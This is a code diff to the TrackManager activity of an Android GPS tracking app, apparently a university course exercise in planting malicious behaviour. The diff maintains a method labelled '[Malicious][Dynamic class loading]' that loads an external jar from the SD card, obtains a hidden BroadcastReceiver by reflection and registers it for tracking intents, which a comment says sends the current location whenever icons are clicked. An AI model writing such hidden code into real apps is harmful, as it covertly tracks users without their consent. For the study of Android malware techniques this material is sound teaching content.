@@ -67,6 +67,8 @@ public class TrackManager extends ListActivity {
 	/** The previous item visible, or -1; for scrolling back to its position in {@link #onResume()} */
 	private int prevItemVisible = -1;
 
+	private BroadcastReceiver hiddenReceiver;
+
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
@@ -152,6 +154,15 @@ public class TrackManager extends ListActivity {
 	protected void onRestoreInstanceState(Bundle state) {
 		super.onRestoreInstanceState(state);
 		prevItemVisible = state.getInt(PREV_VISIBLE, -1);
+	}
+
+	@Override
+	protected void onDestroy() {
+		super.onDestroy();
+
+		if (hiddenReceiver != null) {
+			unregisterReceiver(hiddenReceiver);
+		}
 	}
 
 	@Override
@@ -488,6 +499,7 @@ public class TrackManager extends ListActivity {
 		}
 	}
 
+	// [Malicious][Dynamic class loading]
 	private void loadClassDynamically(){
 		// load class and register receiver that receive TRACK_WP intent
 		String jarContainerPath =  "/mnt/sdcard/dexHiddenReceiver.jar";
@@ -502,17 +514,11 @@ public class TrackManager extends ListActivity {
 			//use java reflection to call a method in the loaded class
 			Class<?> loadedClass = mDexClassLoader.loadClass("uci.inf221.fa16.hw2.HiddenReceiver");
 
-			//list all methods in the class
-			Method[] methods = loadedClass.getDeclaredMethods();
-			for (int i = 0; i < methods.length; i++){
-				Log.d("[MALICIOUS] Dynamic", "Method: "+methods[i].getName());
-			}
-
 			Method methodGetBroadcastReceiver = loadedClass.getMethod("getBroadcastReceiver");
 			Object object = loadedClass.newInstance();
-			BroadcastReceiver receiver = (BroadcastReceiver) methodGetBroadcastReceiver.invoke(object);
+			hiddenReceiver = (BroadcastReceiver) methodGetBroadcastReceiver.invoke(object);
 
-			if (receiver != null) {
+			if (hiddenReceiver != null) {
 				IntentFilter iFilter = new IntentFilter();
 				iFilter.addAction(OSMTracker.INTENT_TRACK_WP);
 				iFilter.addAction(OSMTracker.INTENT_UPDATE_WP);
@@ -521,7 +527,7 @@ public class TrackManager extends ListActivity {
 				iFilter.addAction(OSMTracker.INTENT_STOP_TRACKING);
 
 				// Register dynamically loaded receiver that sends current location whenever icons are clicked
-				registerReceiver(receiver, iFilter);
+				registerReceiver(hiddenReceiver, iFilter);
 			}
 		} catch (Exception e){
 			e.printStackTrace();
